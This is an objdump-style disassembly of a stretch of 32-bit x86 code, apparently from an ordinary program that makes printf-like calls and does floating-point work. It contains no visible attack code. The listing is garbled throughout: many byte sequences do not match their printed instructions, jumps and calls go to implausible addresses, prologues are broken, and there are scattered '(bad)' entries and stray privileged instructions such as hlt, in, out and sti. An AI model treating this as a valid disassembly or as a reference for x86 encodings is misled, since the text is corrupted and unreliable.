  402fea:	1d 8b af cf 95       	sbb    $0x95cfaf8b,%eax
  402fef:	6a 5c                	push   $0x5c
  402ff1:	3e 18 89 55 d0 8b 54 	sbb    %cl,%ds:0x548bd055(%ecx)
  402ff8:	3e 0c 81             	ds or  $0x81,%al
  402ffb:	c1 b7 01 00 00 89 fe 	shll   $0xfe,-0x76ffffff(%edi)
  403002:	d4 83                	aam    $0x83
  403004:	d2 00                	rolb   %cl,(%eax)
  403006:	52                   	push   %edx
  403007:	51                   	push   %ecx
  403008:	e8 83 85 45 84       	call   0x8485b590
  40300d:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  403010:	8a 50 8b             	mov    -0x75(%eax),%dl
  403013:	c3                   	ret
  403014:	97                   	xchg   %eax,%edi
  403015:	4b                   	dec    %ebx
  403016:	01 00                	add    %eax,(%eax)
  403018:	00 6a 75             	add    %ch,0x75(%edx)
  40301b:	83 d1 00             	adc    $0x0,%ecx
  40301e:	68 e8 83 00 00       	push   $0x83e8
  403023:	51                   	push   %ecx
  403024:	50                   	push   %eax
  403025:	e8 66 79 5a 00       	call   0x9aa990
  40302a:	52                   	push   %edx
  40302b:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40302e:	50                   	push   %eax
  40302f:	8b cf                	mov    %edi,%ecx
  403031:	d0 2b                	shrb   $1,(%ebx)
  403033:	d8 8b 45 dc de c2    	fmuls  -0x3d2123bb(%ebx)
  403039:	81 c3 f4 f5 00 00    	add    $0xf5f4,%ebx
  40303f:	83 d0 00             	adc    $0x0,%eax
  403042:	6a 00                	push   $0x0
  403044:	68 61 03 00 fb       	push   $0xfb000361
  403049:	50                   	push   %eax
  40304a:	53                   	push   %ebx
  40304b:	e8 40 85 00 00       	call   0x40b590
  403050:	8b 4d 30             	mov    0x30(%ebp),%ecx
  403053:	52                   	push   %edx
  403054:	50                   	push   %eax
  403055:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403058:	05 f4 01 00 00       	add    $0x1f4,%eax
  40305d:	a3 00 b3 d1 00       	mov    %eax,0xd1b300
  403062:	68 10 03 76 db       	push   $0xdb760310
  403067:	51                   	push   %ecx
  403068:	50                   	push   %eax
  403069:	c5 22                	lds    (%edx),%esp
  40306b:	85 00                	test   %eax,(%eax)
  40306d:	00 52 8b             	add    %dl,-0x75(%edx)
  403070:	54                   	push   %esp
  403071:	32 04 50             	xor    (%eax,%edx,2),%al
  403074:	0d 04 3e 57 00       	or     $0x573e04,%eax
  403079:	68 40 42 0f 41       	push   $0x410f4240
  40307e:	52                   	push   %edx
  40307f:	50                   	push   %eax
  403080:	e8 0b 85 00 00       	call   0x40b590
  403085:	52                   	push   %edx
  403086:	8b 9d fc 8d 8d 44    	mov    0x448d8dfc(%ebp),%ebx
  40308c:	ff                   	(bad)
  40308d:	ff                   	(bad)
  40308e:	ff 50 51             	call   *0x51(%eax)
  403091:	68 f0 d4 40 00       	push   $0x40d4f0
  403096:	52                   	push   %edx
  403097:	ff 15 80 2c 40 00    	call   *0x402c80
  40309d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4030a0:	12 c4                	adc    %ah,%al
  4030a2:	34 40                	xor    $0x40,%al
  4030a4:	8b 0d ac 02 41 00    	mov    0x4102ac,%ecx
  4030aa:	fd                   	std
  4030ab:	60                   	pusha
  4030ac:	20 d9                	and    %bl,%cl
  4030ae:	c1 89 45 f4 0f 8c fd 	rorl   $0xfd,-0x73f00bbb(%ecx)
  4030b5:	fe                   	(bad)
  4030b6:	ff                   	(bad)
  4030b7:	ff 8b 45 f8 50 1c    	decl   0x1c50f845(%ebx)
  4030bd:	15 da 22 40 00       	adc    $0x4022da,%eax
  4030c2:	83 c4 04             	add    $0x4,%esp
  4030c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4030c8:	85 c0                	test   %eax,%eax
  4030ca:	2d 86 6a f8 b3       	sub    $0xb3f86a86,%eax
  4030cf:	15 70 c1 8a 00       	adc    $0x8ac170,%eax
  4030d4:	5f                   	pop    %edi
  4030d5:	5e                   	pop    %esi
  4030d6:	5b                   	pop    %ebx
  4030d7:	31 e5                	xor    %esp,%ebp
  4030d9:	5d                   	pop    %ebp
  4030da:	c3                   	ret
  4030db:	17                   	pop    %ss
  4030dc:	90                   	nop
  4030dd:	90                   	nop
  4030de:	90                   	nop
  4030df:	90                   	nop
  4030e0:	cb                   	lret
  4030e1:	8b ec                	mov    %esp,%ebp
  4030e3:	8b 45 08             	mov    0x8(%ebp),%eax
  4030e6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4030e9:	56                   	push   %esi
  4030ea:	8b 51 10             	mov    0x10(%ecx),%edx
  4030ed:	8b 71 10             	mov    0x10(%ecx),%esi
  4030f0:	8b 40 ea             	mov    -0x16(%eax),%eax
  4030f3:	8b 49 14             	mov    0x14(%ecx),%ecx
  4030f6:	3b c1                	cmp    %ecx,%eax
  4030f8:	7f 16                	jg     0x403110
  4030fa:	7c 04                	jl     0x403100
  4030fc:	3b 39                	cmp    (%ecx),%edi
  4030fe:	73 06                	jae    0x403106
  403100:	83 c8 56             	or     $0x56,%eax
  403103:	5e                   	pop    %esi
  403104:	5d                   	pop    %ebp
  403105:	c3                   	ret
  403106:	ce                   	into
  403107:	c1 7c 0e 7f 04       	sarl   $0x4,0x7f(%esi,%ecx,1)
  40310c:	3b d6                	cmp    %esi,%edx
  40310e:	76 08                	jbe    0x403118
  403110:	b8 01 00 00 00       	mov    $0x1,%eax
  403115:	5e                   	pop    %esi
  403116:	74 c3                	je     0x4030db
  403118:	47                   	inc    %edi
  403119:	c0 5e 78 c3          	rcrb   $0xc3,0x78(%esi)
  40311d:	b7 c5                	mov    $0xc5,%bh
  40311f:	90                   	nop
  403120:	bf 8b d9 8b 45       	mov    $0x458bd98b,%edi
  403125:	3b 8b 4d 0c 56 4b    	cmp    0x4b560c4d(%ebx),%ecx
  40312b:	50                   	push   %eax
  40312c:	18 8b 71 18 8b 40    	sbb    %cl,0x408b1871(%ebx)
  403132:	1c 8b                	sbb    $0x8b,%al
  403134:	49                   	dec    %ecx
  403135:	1c 3b                	sbb    $0x3b,%al
  403137:	c1 5a 16 7c          	rcrl   $0x7c,0x16(%edx)
  40313b:	72 3b                	jb     0x403178
  40313d:	d6                   	salc
  40313e:	9b                   	fwait
  40313f:	06                   	push   %es
  403140:	83 c8 ff             	or     $0xffffffff,%eax
  403143:	5e                   	pop    %esi
  403144:	5d                   	pop    %ebp
  403145:	bf 3b c1 7c 0e       	mov    $0xe7cc13b,%edi
  40314a:	7f 04                	jg     0x403150
  40314c:	ed                   	in     (%dx),%eax
  40314d:	d6                   	salc
  40314e:	76 08                	jbe    0x403158
  403150:	b8 01 75 00 0a       	mov    $0xa007501,%eax
  403155:	5e                   	pop    %esi
  403156:	5d                   	pop    %ebp
  403157:	1a 2a                	sbb    (%edx),%ch
  403159:	c0 5e 5d c3          	rcrb   $0xc3,0x5d(%esi)
  40315d:	e9 90 90 55 8b       	jmp    0x8b95c1f2
  403162:	ec                   	in     (%dx),%al
  403163:	53                   	push   %ebx
  403164:	2e 08 53 79          	or     %dl,%cs:0x79(%ebx)
  403168:	57                   	push   %edi
  403169:	35 71 18 8b 55       	xor    $0x558b1871,%eax
  40316e:	10 8b 41 1c 8b 51    	adc    %cl,0x518b1c41(%ebx)
  403174:	14 2b                	adc    $0x2b,%al
  403176:	ac                   	lods   %ds:(%esi),%al
  403177:	1b c2                	sbb    %edx,%eax
  403179:	8b 55 7d             	mov    0x7d(%ebp),%edx
  40317c:	ab                   	stos   %eax,%es:(%edi)
  40317d:	7a 18                	jp     0x403197
  40317f:	01 c8                	add    %ecx,%eax
  403181:	10 8b 5a 14 a5 f9    	adc    %cl,-0x65aeba6(%ebx)
  403187:	8b 4a 1c             	mov    0x1c(%edx),%ecx
  40318a:	1b f3                	sbb    %ebx,%esi
  40318c:	74 81                	je     0x40310f
  40318e:	7f 18                	jg     0x4031a8
  403190:	8b 7a 32             	mov    0x32(%edx),%edi
  403193:	f7 89 08 5f 5e 83 c8 	testl  $0x775bffc8,-0x7ca1a0f8(%ecx)
  40319a:	ff 5b 77 
  40319d:	c3                   	ret
  40319e:	3b 4a 7c             	cmp    0x7c(%edx),%ecx
  4031a1:	10 72 04             	adc    %dh,0x4(%edx)
  4031a4:	3b f7                	cmp    %edi,%esi
  4031a6:	76 0a                	jbe    0x4031b2
  4031a8:	5f                   	pop    %edi
  4031a9:	5e                   	pop    %esi
  4031aa:	b8 01 2c 00 00       	mov    $0x2c01,%eax
  4031af:	5b                   	pop    %ebx
  4031b0:	d2 c3                	rol    %cl,%bl
  4031b2:	5f                   	pop    %edi
  4031b3:	5e                   	pop    %esi
  4031b4:	33 c0                	xor    %eax,%eax
  4031b6:	5b                   	pop    %ebx
  4031b7:	5d                   	pop    %ebp
  4031b8:	c3                   	ret
  4031b9:	90                   	nop
  4031ba:	90                   	nop
  4031bb:	90                   	nop
  4031bc:	64 90                	fs nop
  4031be:	90                   	nop
  4031bf:	90                   	nop
  4031c0:	55                   	push   %ebp
  4031c1:	8b ec                	mov    %esp,%ebp
  4031c3:	8b 45 08             	mov    0x8(%ebp),%eax
  4031c6:	8b 72 0c             	mov    0xc(%edx),%esi
  4031c9:	56                   	push   %esi
  4031ca:	57                   	push   %edi
  4031cb:	bd 08 8b 71 08       	mov    $0x8718b08,%ebp
  4031d0:	2e 0c 0c             	cs or  $0xc,%al
  4031d3:	8b 49 0c             	mov    0xc(%ecx),%ecx
  4031d6:	3b c1                	cmp    %ecx,%eax
  4031d8:	7f 83                	jg     0x40315d
  4031da:	c8 04 3b d6          	enter  $0x3b04,$0xd6
  4031de:	73 06                	jae    0x4031e6
  4031e0:	83 c8 ff             	or     $0xffffffff,%eax
  4031e3:	5e                   	pop    %esi
  4031e4:	5d                   	pop    %ebp
  4031e5:	c3                   	ret
  4031e6:	3b c1                	cmp    %ecx,%eax
  4031e8:	7c 0e                	jl     0x4031f8
  4031ea:	7f 04                	jg     0x4031f0
  4031ec:	3b d6                	cmp    %esi,%edx
  4031ee:	76 16                	jbe    0x403206
  4031f0:	1f                   	pop    %ds
  4031f1:	01 00                	add    %eax,(%eax)
  4031f3:	00 00                	add    %al,(%eax)
  4031f5:	5e                   	pop    %esi
  4031f6:	75 c3                	jne    0x4031bb
  4031f8:	33 c0                	xor    %eax,%eax
  4031fa:	5e                   	pop    %esi
  4031fb:	5d                   	pop    %ebp
  4031fc:	9a 90 90 90 55 ae ec 	lcall  $0xecae,$0x55909090
  403203:	83 f0 40             	xor    $0x40,%eax
  403206:	88 a0 0b 9d 00 8b    	mov    %ah,-0x74ff62f5(%eax)
  40320c:	0d a4 0b 22 00       	or     $0x220ba4,%eax
  403211:	53                   	push   %ebx
  403212:	8b 4f c0             	mov    -0x40(%edi),%ecx
  403215:	0b 41 00             	or     0x0(%ecx),%eax
  403218:	56                   	push   %esi
  403219:	57                   	push   %edi
  40321a:	8b 3d 52 0b 41 00    	mov    0x410b52,%edi
  403220:	2b c3                	sub    %ebx,%eax
  403222:	73 cf                	jae    0x4031f3
  403224:	8b 15 e8 17 41 c4    	mov    0xc44117e8,%edx
  40322a:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40322d:	88 21                	mov    %ah,(%ecx)
  40322f:	cc                   	int3
  403230:	e3 6d                	jecxz  0x40329f
  403232:	c8 8b 35 12          	enter  $0x358b,$0x12
  403236:	c1 40 44 52          	roll   $0x52,0x44(%eax)
  40323a:	68 ec e7 40 0a       	push   $0xa40e7ec
  40323f:	8c 0d 38 c2 40 00    	mov    %cs,0x40c238
  403245:	dd 5d c8             	fstpl  -0x38(%ebp)
  403248:	ff d6                	call   *%esi
  40324a:	a1 f0 17 43 9c       	mov    0x9c4317f0,%eax
  40324f:	68 e0 13 41 bd       	push   $0xbd4113e0
  403254:	50                   	push   %eax
  403255:	50                   	push   %eax
  403256:	a1 a8 0b 41 00       	mov    0x410ba8,%eax
  40325b:	50                   	push   %eax
  40325c:	68 a0 e7 40 00       	push   $0x40e7a0
  403261:	4a                   	dec    %edx
  403262:	cc                   	int3
  403263:	8b 0d 00 26 41 00    	mov    0x412600,%ecx
  403269:	a1 f0 17 41 00       	mov    0x4117f0,%eax
  40326e:	8b dd                	mov    %ebp,%ebx
  403270:	a8 0b                	test   $0xb,%al
  403272:	41                   	inc    %ecx
  403273:	00 7e 50             	add    %bh,0x50(%esi)
  403276:	50                   	push   %eax
  403277:	52                   	push   %edx
  403278:	68 50 e7 40 00       	push   $0x40e750
  40327d:	ff d6                	call   *%esi
  40327f:	8b 0d 96 0b 41 00    	mov    0x410b96,%ecx
  403285:	33 c0                	xor    %eax,%eax
  403287:	66 f8                	data16 clc
  403289:	f4                   	hlt
  40328a:	17                   	pop    %ss
  40328b:	d9 00                	flds   (%eax)
  40328d:	50                   	push   %eax
  40328e:	60                   	pusha
  40328f:	f0 84 0c 00          	lock test %cl,(%eax,%eax,1)
  403293:	50                   	push   %eax
  403294:	1d 51 db 00 e7       	sbb    $0xe700db51,%eax
  403299:	40                   	inc    %eax
  40329a:	00 ff                	add    %bh,%bh
  40329c:	d6                   	salc
  40329d:	8b 15 e4 17 fc 00    	mov    0xfc17e4,%edx
  4032a3:	58                   	pop    %eax
  4032a4:	f0 17                	lock pop %ss
  4032a6:	41                   	inc    %ecx
  4032a7:	f6 83 c4 44 52 50 50 	testb  $0x50,0x505244c4(%ebx)
  4032ae:	a1 a8 0b 41 00       	mov    0x410ba8,%eax
  4032b3:	50                   	push   %eax
  4032b4:	cd b0                	int    $0xb0
  4032b6:	e6 9b                	out    %al,$0x9b
  4032b8:	35 ff d6 8b 0d       	xor    $0xd8bd6ff,%eax
  4032bd:	7d 9a                	jge    0x403259
  4032bf:	41                   	inc    %ecx
  4032c0:	39 a1 f0 17 41 dd    	cmp    %esp,-0x22bee810(%ecx)
  4032c6:	e3 15                	jecxz  0x4032dd
  4032c8:	5d                   	pop    %ebp
  4032c9:	0b fe                	or     %esi,%edi
  4032cb:	00 51 50             	add    %dl,0x50(%ecx)
  4032ce:	50                   	push   %eax
  4032cf:	52                   	push   %edx
  4032d0:	e2 58                	loop   0x40332a
  4032d2:	ff 48 00             	decl   0x0(%eax)
  4032d5:	ff d6                	call   *%esi
  4032d7:	a1 18 d0 09 00       	mov    0x9d018,%eax
  4032dc:	8b 0d 20 0b b0 00    	mov    0xb00b20,%ecx
  4032e2:	50                   	push   %eax
  4032e3:	a1 f0 17 41 00       	mov    0x4117f0,%eax
  4032e8:	14 50                	adc    $0x50,%al
  4032ea:	51                   	push   %ecx
  4032eb:	68 87 69 3b 00       	push   $0x3b6987
  4032f0:	ff d6                	call   *%esi
  4032f2:	4d                   	dec    %ebp
  4032f3:	55                   	push   %ebp
  4032f4:	cc                   	int3
  4032f5:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4032f8:	52                   	push   %edx
  4032f9:	50                   	push   %eax
  4032fa:	ee                   	out    %al,(%dx)
  4032fb:	f0 17                	lock pop %ss
  4032fd:	41                   	inc    %ecx
  4032fe:	fb                   	sti
  4032ff:	50                   	push   %eax
  403300:	99                   	cltd
  403301:	8b 0d a8 0b 41 00    	mov    0x410ba8,%ecx
  403307:	51                   	push   %ecx
  403308:	68 a8 e5 40 00       	push   $0x40e5a8
  40330d:	8d b0 8b fb 8d 02    	lea    0x28dfb8b(%eax),%esi
  403313:	8b 00                	mov    (%eax),%eax
  403315:	d3 db                	rcr    %cl,%ebx
  403317:	17                   	pop    %ss
  403318:	41                   	inc    %ecx
  403319:	00 83 c4 54 52 50    	add    %al,0x505254c4(%ebx)
  40331f:	50                   	push   %eax
  403320:	a1 a8 0b 41 81       	mov    0x81410ba8,%eax
  403325:	50                   	push   %eax
  403326:	a1 58 e5 51 00       	mov    0x51e558,%eax
  40332b:	2b d6                	sub    %esi,%edx
  40332d:	e3 0d                	jecxz  0x40333c
  40332f:	b8 02 41 00 a1       	mov    $0xa1004102,%eax
  403334:	34 17                	xor    $0x17,%al
  403336:	41                   	inc    %ecx
  403337:	00 8b 20 39 0b 53    	add    %cl,0x530b3920(%ebx)
  40333d:	00 66 50             	add    %ah,0x50(%esi)
  403340:	50                   	push   %eax
  403341:	52                   	push   %edx
  403342:	68 08 e5 40 00       	push   $0x40e508
  403347:	ff d6                	call   *%esi
  403349:	df da                	(bad)
  40334b:	02 41 00             	add    0x0(%ecx),%al
  40334e:	83 c4 2e             	add    $0x2e,%esp
  403351:	85 c0                	test   %eax,%eax
  403353:	74 ba                	je     0x40330f
  403355:	a1 cc 02 41 00       	mov    0x4102cc,%eax
  40335a:	8b 0d c0 02 41 a7    	mov    0xa74102c0,%ecx
  403360:	8b 15 3a 02 41 00    	mov    0x41023a,%edx
  403366:	50                   	push   %eax
  403367:	63 f0                	arpl   %esi,%eax
  403369:	17                   	pop    %ss
  40336a:	41                   	inc    %ecx
  40336b:	00 bd 8b 22 a8 0b    	add    %bh,0xba8228b(%ebp)
  403371:	41                   	inc    %ecx
  403372:	00 52 50             	add    %dl,0x50(%edx)
  403375:	b1 68                	mov    $0x68,%cl
  403377:	b0 e4                	mov    $0xe4,%al
  403379:	40                   	inc    %eax
  40337a:	00 ff                	add    %bh,%bh
  40337c:	d6                   	salc
  40337d:	86 c4                	xchg   %al,%ah
  40337f:	18 a1 d0 02 41 00    	sbb    %ah,0x4102d0(%ecx)
  403385:	85 c0                	test   %eax,%eax
  403387:	74 19                	je     0x4033a2
  403389:	8b 15 a8 0b 41 71    	mov    0x71410ba8,%edx
  40338f:	50                   	push   %eax
  403390:	a1 f0 17 41 00       	mov    0x4117f0,%eax
  403395:	50                   	push   %eax
  403396:	50                   	push   %eax
  403397:	52                   	push   %edx
  403398:	68 60 e4 01 00       	push   $0x1e460
  40339d:	ff d6                	call   *%esi
  40339f:	83 c4 14             	add    $0x14,%esp
  4033a2:	a1 68 02 41 00       	mov    0x410268,%eax
  4033a7:	85 44 0b 1e          	test   %eax,0x1e(%ebx,%ecx,1)
  4033ab:	a1 b0 f9 41 00       	mov    0x41f9b0,%eax
  4033b0:	8b 0d a8 0b 8b 23    	mov    0x238b0ba8,%ecx
  4033b6:	50                   	push   %eax
  4033b7:	a1 f0 17 ae 00       	mov    0xae17f0,%eax
  4033bc:	50                   	push   %eax
  4033bd:	50                   	push   %eax
  4033be:	51                   	push   %ecx
  4033bf:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4033c0:	10 e4                	adc    %ah,%ah
  4033c2:	35 00 ff d6 83       	xor    $0x83d6ff00,%eax
  4033c7:	c4 4f 8b             	les    -0x75(%edi),%ecx
  4033ca:	15 94 02 41 00       	adc    $0x410294,%eax
  4033cf:	a1 35 a9 41 00       	mov    0x41a935,%eax
  4033d4:	8b 0d a8 2e 41 23    	mov    0x23412ea8,%ecx
  4033da:	52                   	push   %edx
  4033db:	12 b4 61 17 54 00 50 	adc    0x50005417(%ecx,%eiz,2),%dh
  4033e2:	50                   	push   %eax
  4033e3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4033e4:	68 b8 e3 40 00       	push   $0x40e3b8
  4033e9:	ff d6                	call   *%esi
  4033eb:	41                   	inc    %ecx
  4033ec:	60                   	pusha
  4033ed:	02 41 00             	add    0x0(%ecx),%al
  4033f0:	83 c4 1d             	add    $0x1d,%esp
  4033f3:	83 f8 01             	cmp    $0x1,%eax
  4033f6:	75 25                	jne    0x40341d
  4033f8:	8b 15 a4 02 41 00    	mov    0x4102a4,%edx
  4033fe:	a1 a0 02 41 00       	mov    0x4102a0,%eax
  403403:	8b 0d a8 0b 5d 00    	mov    0x5d0ba8,%ecx
  403409:	52                   	push   %edx
  40340a:	72 a1                	jb     0x4033ad
  40340c:	f0 17                	lock pop %ss
  40340e:	41                   	inc    %ecx
  40340f:	e5 50                	in     $0x50,%eax
  403411:	50                   	push   %eax
  403412:	51                   	push   %ecx
  403413:	ba 68 e3 40 00       	mov    $0x40e368,%edx
  403418:	ff d6                	call   *%esi
  40341a:	83 c4 18             	add    $0x18,%esp
  40341d:	83 3d 60 ad 32 00 02 	cmpl   $0x2,0x32ad60
  403424:	9b                   	fwait
  403425:	25 87 15 a4 02       	and    $0x2a41587,%eax
  40342a:	41                   	inc    %ecx
  40342b:	00 a1 a0 02 41 b7    	add    %ah,-0x48befd60(%ecx)
  403431:	8b 0d a8 0b c9 6f    	mov    0x6fc90ba8,%ecx
  403437:	52                   	push   %edx
  403438:	50                   	push   %eax
  403439:	a1 f0 17 41 00       	mov    0x4117f0,%eax
  40343e:	50                   	push   %eax
  40343f:	50                   	push   %eax
  403440:	51                   	push   %ecx
  403441:	0b b1 e3 40 00 ff    	or     -0xffbf1d(%ecx),%esi
  403447:	be 0d c4 18 df       	mov    $0xdf18c40d,%esi
  40344c:	7b 9c                	jnp    0x4033ea
  40344e:	02 41 f8             	add    -0x8(%ecx),%al
  403451:	98                   	cwtl
  403452:	98                   	cwtl
  403453:	02 51 00             	add    0x0(%ecx),%dl
  403456:	8b 0d 22 0b 41 00    	mov    0x410b22,%ecx
  40345c:	52                   	push   %edx
  40345d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40345e:	78 f0                	js     0x403450
  403460:	17                   	pop    %ss
  403461:	41                   	inc    %ecx
  403462:	00 50 ec             	add    %dl,-0x14(%eax)
  403465:	51                   	push   %ecx
  403466:	9f                   	lahf
  403467:	1c e3                	sbb    $0xe3,%al
  403469:	b0 00                	mov    $0x0,%al
  40346b:	ff d6                	call   *%esi
  40346d:	c6 45 23 c3          	movb   $0xc3,0x23(%ebp)
  403471:	1d 30 c2 40 4b       	sbb    $0x4b40c230,%eax
  403476:	83 c4 18             	add    $0x18,%esp
  403479:	df e0                	fnstsw %ax
  40347b:	f6 c4 44             	test   $0x44,%ah
  40347e:	0f 8b ce 00 00 00    	jnp    0x403552
  403484:	dd 72 28             	fnsave 0x28(%edx)
  403487:	c2 40 00             	ret    $0x40
  40348a:	dc 75 c8             	fdivl  -0x38(%ebp)
  40348d:	a1 f0 17 89 00       	mov    0x8917f0,%eax
  403492:	8b 15 a8 0b e6 57    	mov    0x57e60ba8,%edx
  403498:	83 e8 64             	sub    $0x64,%eax
  40349b:	dd 5d c8             	fstpl  -0x38(%ebp)
  40349e:	db 05 ac 02 41 00    	fildl  0x4102ac
  4034a4:	dc 4d c8             	fmull  -0x38(%ebp)
  4034a7:	e4 0d                	in     $0xd,%al
  4034a9:	20 c2                	and    %al,%dl
  4034ab:	40                   	inc    %eax
  4034ac:	00 dd                	add    %bl,%ch
  4034ae:	1c 24                	sbb    $0x24,%al
  4034b0:	50                   	push   %eax
  4034b1:	50                   	push   %eax
  4034b2:	52                   	push   %edx
  4034b3:	68 39 e2 40 00       	push   $0x40e239
  4034b8:	ff d6                	call   *%esi
  4034ba:	df 2d 90 12 41 00    	fildll 0x411290
  4034c0:	a1 f0 17 41 e8       	mov    0xe84117f0,%eax
  4034c5:	83 c4 10             	add    $0x10,%esp
  4034c8:	f9                   	stc
  4034c9:	92                   	xchg   %eax,%edx
  4034ca:	c8 dd 1c 4a          	enter  $0x1cdd,$0x4a
  4034ce:	50                   	push   %eax
  4034cf:	50                   	push   %eax
  4034d0:	89 a8 0b 50 be 50    	mov    %ebp,0x50be500b(%eax)
  4034d6:	68 08 e2 40 00       	push   $0x40e208
  4034db:	49                   	dec    %ecx
  4034dc:	d6                   	salc
  4034dd:	88 60 02             	mov    %ah,0x2(%eax)
  4034e0:	41                   	inc    %ecx
  4034e1:	00 b4 c4 cc 85 c0 3e 	add    %dh,0x3ec085cc(%esp,%eax,8)
  4034e8:	69 df 2d a0 b1 41    	imul   $0x41b1a02d,%edi,%ebx
  4034ee:	00 35 f0 17 41 00    	add    %dh,0x4117f0
  4034f4:	38 0d a8 0b 5a 00    	cmp    %cl,0x5a0ba8
  4034fa:	0e                   	push   %cs
  4034fb:	ec                   	in     (%dx),%al
  4034fc:	08 dc                	or     %bl,%ah
  4034fe:	4d                   	dec    %ebp
  4034ff:	04 2e                	add    $0x2e,%al
  403501:	1c 24                	sbb    $0x24,%al
  403503:	50                   	push   %eax
  403504:	50                   	push   %eax
  403505:	51                   	push   %ecx
  403506:	68 b8 e1 40 00       	push   $0x40e1b8
  40350b:	aa                   	stos   %al,%es:(%edi)
  40350c:	d6                   	salc
  40350d:	8b e9                	mov    %ecx,%ebp
  40350f:	8e d2                	mov    %edx,%ss
  403511:	c1 00 8b             	roll   $0x8b,(%eax)
  403514:	de 2c 02             	fisubrs (%edx,%eax,1)
  403517:	41                   	inc    %ecx
  403518:	00 9c a4 02 41 00 8b 	add    %bl,-0x74ffbefe(%esp,%eiz,4)
  40351f:	0d 94 02 55 00       	or     $0x550294,%eax
  403524:	3d d7 13 c1 89       	cmp    $0x89c113d7,%eax
  403529:	08 d0                	or     %dl,%al
  40352b:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40352e:	a1 f0 17 41 00       	mov    0x4117f0,%eax
  403533:	df 61 d0             	fbld   -0x30(%ecx)
  403536:	f1                   	int1
  403537:	0d a8 0b 41 00       	or     $0x410ba8,%eax
  40353c:	83 a6 f2 dc 4d c8 dd 	andl   $0xffffffdd,-0x37b2230e(%esi)
  403543:	1c 24                	sbb    $0x24,%al
  403545:	50                   	push   %eax
  403546:	59                   	pop    %ecx
  403547:	51                   	push   %ecx
  403548:	68 68 e1 40 5a       	push   $0x5a40e168
  40354d:	ff d6                	call   *%esi
  40354f:	83 c4 18             	add    $0x18,%esp
  403552:	33 28                	xor    (%eax),%ebp
  403554:	7f ff                	jg     0x403555
  403556:	89 55 e0             	mov    %edx,-0x20(%ebp)
  403559:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40355c:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40355f:	89 55 f4             	mov    %edx,-0xc(%ebp)
  403562:	89 55 e8             	mov    %edx,-0x18(%ebp)
  403565:	89 53 ec             	mov    %edx,-0x14(%ebx)
  403568:	8b 15 ac 68 41 dd    	mov    0xdd4168ac,%edx
  40356e:	33 90 92 3a ff b8    	xor    -0x4700c56e(%eax),%edx
  403574:	ff                   	(bad)
  403575:	ff                   	(bad)
  403576:	ff                   	(bad)
  403577:	7f 85                	jg     0x4034fe
  403579:	d2 89 4d d0 c7 45    	rorb   %cl,0x45c7d04d(%ecx)
  40357f:	04 a2                	add    $0xa2,%al
  403581:	ff                   	(bad)
  403582:	ff                   	(bad)
  403583:	ff 89 45 ab 0f 8e    	decl   -0x71f054bb(%ecx)
  403589:	c7 00 00 00 a4 15    	movl   $0x15a40000,(%eax)
  40358f:	3f                   	aas
  403590:	0b 41 00             	or     0x0(%ecx),%eax
  403593:	83 c2 18             	add    $0x18,%edx
  403596:	89 55 8f             	mov    %edx,-0x71(%ebp)
  403599:	91                   	xchg   %eax,%ecx
  40359a:	54                   	push   %esp
  40359b:	ac                   	lods   %ds:(%esi),%al
  40359c:	0c 41                	or     $0x41,%al
  40359e:	00 a6 1e df 8b 55    	add    %ah,0x558bdf1e(%esi)
  4035a4:	fc                   	cld
  4035a5:	8b 52 4e             	mov    0x4e(%edx),%edx
  4035a8:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4035ab:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4035ae:	3a 18                	cmp    (%eax),%bl
  4035b0:	fc                   	cld
  4035b1:	7c 79                	jl     0x40362c
  4035b3:	7f 0a                	jg     0x4035bf
  4035b5:	8b 55 c8             	mov    -0x38(%ebp),%edx
  4035b8:	3b d6                	cmp    %esi,%edx
  4035ba:	8b 55 48             	mov    0x48(%ebp),%edx
  4035bd:	72 09                	jb     0x4035c8
  4035bf:	8b 45 d9             	mov    -0x27(%ebp),%eax
  4035c2:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4035c5:	8b 42 fc             	mov    -0x4(%edx),%eax
  4035c8:	8b 0a                	mov    (%edx),%ecx
  4035ca:	8b 52 be             	mov    -0x42(%edx),%edx
  4035cd:	39 55 dc             	cmp    %edx,-0x24(%ebp)
  4035d0:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  4035d3:	68 0d 7f 05 39       	push   $0x39057f0d
  4035d8:	4d                   	dec    %ebp
  4035d9:	95                   	xchg   %eax,%ebp
  4035da:	72 06                	jb     0x4035e2
  4035dc:	89 4d a3             	mov    %ecx,-0x5d(%ebp)
  4035df:	34 55                	xor    $0x55,%al
  4035e1:	e1 8b                	loope  0x40356e
  4035e3:	55                   	push   %ebp
  4035e4:	fc                   	cld
  4035e5:	8b 52 fc             	mov    -0x4(%edx),%edx
  4035e8:	2c 55                	sub    $0x55,%al
  4035ea:	e7 89                	out    %eax,$0x89
  4035ec:	55                   	push   %ebp
  4035ed:	cc                   	int3
  4035ee:	8a 16                	mov    (%esi),%dl
  4035f0:	21 08                	and    %ecx,(%eax)
  4035f2:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4035f5:	3b 55 c8             	cmp    -0x38(%ebp),%edx
  4035f8:	77 0c                	ja     0x403606
  4035fa:	fc                   	cld
  4035fb:	55                   	push   %ebp
  4035fc:	c8 89 55 f0          	enter  $0x5589,$0xf0
  403600:	8b 55 cc             	mov    -0x34(%ebp),%edx
  403603:	bd 55 16 8b de       	mov    $0xde8b1655,%ebp
  403608:	b2 39                	mov    $0x39,%dl
  40360a:	55                   	push   %ebp
  40360b:	16                   	push   %ss
  40360c:	7f 0d                	jg     0x40361b
  40360e:	7c 05                	jl     0x403615
  403610:	39 4d e8             	cmp    %ecx,-0x18(%ebp)
  403613:	77 06                	ja     0x40361b
  403615:	6a 4d                	push   $0x4d
  403617:	e8 89 55 ec 8b       	call   0x8c2c8ba5
  40361c:	55                   	push   %ebp
